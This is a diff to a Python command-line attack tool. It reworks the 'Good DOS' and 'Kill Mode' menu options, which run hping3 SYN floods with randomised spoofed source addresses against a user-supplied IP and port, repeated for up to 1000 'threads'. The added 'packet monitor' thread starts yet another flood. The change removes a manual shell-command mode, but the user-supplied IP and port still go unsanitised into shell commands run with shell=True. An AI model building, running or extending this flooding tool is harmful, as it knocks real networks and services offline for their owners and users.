@@ -1243,111 +1243,103 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-def manual_hping3_command():
-    """
-    Allows the user to enter custom hping3 commands manually.
-    """
-    try:
-        while True:
-            command = input("Enter an hping3 command (or press Enter to return to the menu): ").strip()
-            if not command:
-                break
-            subprocess.run(command, shell=True)
-    except KeyboardInterrupt:
-        print("\nReturning to the menu.")
-
 def run_hping3_good_dos(target_ip, target_port, threads):
     command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
-    print(f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")
-    
+    print(Fore.YELLOW + f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")
+
+    def packet_monitor():
+        # Monitor packets sent by hping3 and show them in real-time
+        command_monitor = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
+        process = subprocess.Popen(command_monitor, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        while True:
+            output = process.stdout.readline()
+            if output == b"" and process.poll() is not None:
+                break
+            if output:
+                line = output.decode('utf-8').strip()
+                # Display packet information with color based on content
+                print(Fore.GREEN + line)
+
+    # Start the packet monitor in a separate thread
+    monitor_thread = threading.Thread(target=packet_monitor)
+    monitor_thread.daemon = True
+    monitor_thread.start()
+
+    # Send packets with hping3
     for _ in range(threads):
         subprocess.run(command_good_dos, shell=True)
 
+    monitor_thread.join()
+
 def run_hping3_kill_mode(target_ip, target_port, threads):
     command_kill_mode = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
-    print(f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")
-    
+    print(Fore.YELLOW + f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")
+
+    def packet_monitor():
+        # Monitor packets sent by hping3 and show them in real-time
+        command_monitor = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
+        process = subprocess.Popen(command_monitor, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        while True:
+            output = process.stdout.readline()
+            if output == b"" and process.poll() is not None:
+                break
+            if output:
+                line = output.decode('utf-8').strip()
+                # Display packet information with color based on content
+                print(Fore.RED + line)
+
+    # Start the packet monitor in a separate thread
+    monitor_thread = threading.Thread(target=packet_monitor)
+    monitor_thread.daemon = True
+    monitor_thread.start()
+
+    # Send packets with hping3
     for _ in range(threads):
         subprocess.run(command_kill_mode, shell=True)
 
-def run_hping3_good_dos_prompt():
-    while True:
-        try:
-            target_ip = input("Enter the target IP address: ").strip()
-            target_port = input("Enter the port number (e.g., 80): ").strip()
-            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
-
-            if threads in [20, 80, 50, 100, 250, 500, 1000]:
-                run_hping3_good_dos(target_ip, target_port, threads)
-            else:
-                print("Invalid thread count. Please enter one of the allowed values.")
-                continue
-        except Exception as e:
-            print(f"Error running command: {e}")
-        
-        cont = input("Do you want to run another attack? (y/n): ").strip().lower()
-        if cont != 'y':
-            print("Returning to the menu...")
-            break
-
-def run_hping3_kill_mode_prompt():
-    while True:
-        try:
-            target_ip = input("Enter the target IP address: ").strip()
-            target_port = input("Enter the port number (e.g., 80): ").strip()
-            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
-
-            if threads in [20, 80, 50, 100, 250, 500, 1000]:
-                run_hping3_kill_mode(target_ip, target_port, threads)
-            else:
-                print("Invalid thread count. Please enter one of the allowed values.")
-                continue
-        except Exception as e:
-            print(f"Error running command: {e}")
-        
-        cont = input("Do you want to run another attack? (y/n): ").strip().lower()
-        if cont != 'y':
-            print("Returning to the menu...")
-            break
+    monitor_thread.join()
 
 def hping3_menu():
     while True:
-        print("\nHping3 Menu:")
-        print("1. Run Hping3 (Manual Command)")
-        print("2. Good DOS")
-        print("3. Kill Mode")
-        print("4. Return to Main Menu")
+        print(Style.BRIGHT + Fore.BLUE + "\n=== DDos MENU ===")
+        print("1. Good DOS Attack")
+        print("2. Kill Mode Attack")
+        print("3. Return to Main Menu")
 
-        choice = input("Choose an option: ")
+        choice = input(Fore.CYAN + "Choose an option: ")
 
         if choice == "1":
-            manual_hping3_command()
+            try:
+                target_ip = input("Enter the target IP address: ").strip()
+                target_port = input("Enter the port number (e.g., 80): ").strip()
+                threads = int(input("Enter the number of threads (10, 20, 50, 80, 100, 250, 500, 1000): ").strip())
+
+                if threads in [10, 20, 50, 80, 100, 250, 500, 1000]:
+                    run_hping3_good_dos(target_ip, target_port, threads)
+                else:
+                    print("Invalid thread count. Please enter one of the allowed values.")
+            except Exception as e:
+                print(f"Error: {e}")
         elif choice == "2":
-            run_hping3_good_dos_prompt()
+            try:
+                target_ip = input("Enter the target IP address: ").strip()
+                target_port = input("Enter the port number (e.g., 80): ").strip()
+                threads = int(input("Enter the number of threads (10, 20, 50, 80, 100, 250, 500, 1000): ").strip())
+
+                if threads in [10, 20, 50, 80, 100, 250, 500, 1000]:
+                    run_hping3_kill_mode(target_ip, target_port, threads)
+                else:
+                    print("Invalid thread count. Please enter one of the allowed values.")
+            except Exception as e:
+                print(f"Error: {e}")
         elif choice == "3":
-            run_hping3_kill_mode_prompt()
-        elif choice == "4":
+            print(Fore.CYAN + "Returning to the main menu...")
             break
         else:
-            print("Invalid choice, please try again.")
+            print(Fore.RED + "Invalid choice, please try again.")
 
-# Main Menu
-def main_menu():
-    while True:
-        clear_screen()
-        print("\nMain Menu:")
-        print("1. Hping3 Menu")
-        print("2. Exit")
-
-        choice = input("Choose an option: ")
-
-        if choice == "1":
-            hping3_menu()
-        elif choice == "2":
-            print("Exiting...")
-            break
-        else:
-            print("Invalid choice, please try again.")
 def whois_lookup():
     try:
         ip_address = input("Enter an IP address for WHOIS lookup: ").strip()
